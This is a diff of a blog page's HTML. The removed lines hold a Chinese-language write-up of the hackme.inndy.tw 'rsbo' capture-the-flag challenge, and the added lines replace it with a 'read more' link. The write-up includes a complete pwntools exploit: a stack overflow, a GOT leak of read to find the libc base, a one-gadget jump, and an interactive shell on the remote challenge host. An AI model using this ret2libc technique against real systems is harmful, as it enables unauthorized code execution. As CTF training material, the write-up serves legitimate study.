-<p>接著題目說 <code>Open</code>, <code>Read</code>, 就看不太懂了</p>
-<p>不過觀察組語可發現 <code>main()</code> stack大小小於<code>0x80(128)</code>, 而<code>read_80_bytes()</code> 造成 overflow</p>
-<p>因為ASLR, NX 的關係, 需要想辦法ROP</p>
-<p>但binary太小, 組不起ROP chain, 因此使用libc</p>
-<p>只要Leak GOT, 接著就可以算出libc base &amp; getshell了</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit:"></a>exploit:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;rsbo&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7706</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;rsbo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so.i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stage 1 (leak read)</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;_start&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Libc base at: &#123;&#125;&#x27;</span>.format(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5faa5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-
-<p>p.s. shell連上去之後可以拿到2個 Flag (直接Double Kill XD)</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/hackme-inndy-tw-Rsbo-Writeup/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1000,12 +794,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">標籤</span>
       </div>
   </nav>
